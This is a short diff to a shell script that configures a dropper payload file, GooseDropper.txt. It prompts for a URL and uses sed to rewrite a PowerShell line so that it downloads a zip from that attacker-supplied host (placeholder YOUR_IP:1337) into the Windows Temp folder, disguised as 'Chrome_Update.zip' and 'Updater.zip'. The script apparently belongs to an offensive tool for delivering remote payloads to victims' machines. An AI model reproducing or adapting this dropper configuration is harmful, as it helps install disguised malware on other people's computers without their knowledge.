@@ -23,7 +23,7 @@ then
 	read -p "Enter your URL: " SRC
 
 	#Add your URL to the payload
-	sed -i "s/powershell wget YOUR_IP:1337 -OutFile \$ENV:Temp\/Updater.zip/powershell \"wget \'$SRC\' -OutFile \$ENV:Temp\/Updater.zip\"/" GooseDropper.txt
+	sed -i "s/powershell wget YOUR_IP:1337\/Chrome_Update.zip -OutFile \$ENV:Temp\/Updater.zip/powershell \"wget \'$SRC\' -OutFile \$ENV:Temp\/Updater.zip\"/" GooseDropper.txt
 	
 	#Remind users to have the zip ready
 	echo "Please ensure a ZIP file with proper contents and formatting is hosted at the provided URL"
